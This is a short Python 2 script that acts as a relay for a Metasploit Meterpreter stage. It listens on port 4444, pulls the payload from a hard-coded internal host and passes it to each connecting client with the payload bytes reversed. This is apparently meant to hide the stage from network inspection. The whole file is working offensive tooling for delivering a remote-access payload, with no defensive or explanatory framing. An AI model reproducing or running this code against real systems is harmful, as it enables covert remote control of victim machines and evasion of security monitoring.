#!/usr/bin/env python

import sys, socket, thread, ssl, re, base64, time

import xml.etree.ElementTree as et

HOST = '0.0.0.0'
PORT = 4444
BUFSIZE = 4096

def child(sock,certfile='',keyfile=''):
	global packetA
	try:

		name="10.1.225.110"
		print 'hostname:', name

		targetsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		print 'SERVER CONNECT to:', name
		targetsock.connect((name,PORT))
		
		print 'receiving packet size'
		pkt = targetsock.recv(4096)
		pktfixed=str(pkt.encode('hex_codec'))
		pktfixed2=pktfixed[6:8]+pktfixed[4:6]+pktfixed[2:4]+pktfixed[0:2]
		print 'receiving meterpreter size: '+str(int(pktfixed2,16))+" HEX: "+pktfixed2+" original: "+pktfixed
		pkt2 = targetsock.recv(int(pktfixed2,16))

		sock.send(pkt)
		sock.send(pkt2[::-1])

	except Exception as e:
		print "closing client socket:",e
		sock.close()

if __name__=='__main__': 
	keyfile = ''
	certfile = ''
	if len(sys.argv) == 3:
		keyfile = sys.argv[1]
		certfile = sys.argv[2]
	myserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	myserver.bind((HOST, PORT))
	myserver.listen(2)
	print 'LISTENER ready on port', PORT
	try:
		while 1:
			client, addr = myserver.accept()
			print 'CLIENT CONNECT from:', addr
			thread.start_new_thread(child, (client,certfile,keyfile))
	except KeyboardInterrupt:
		server.close()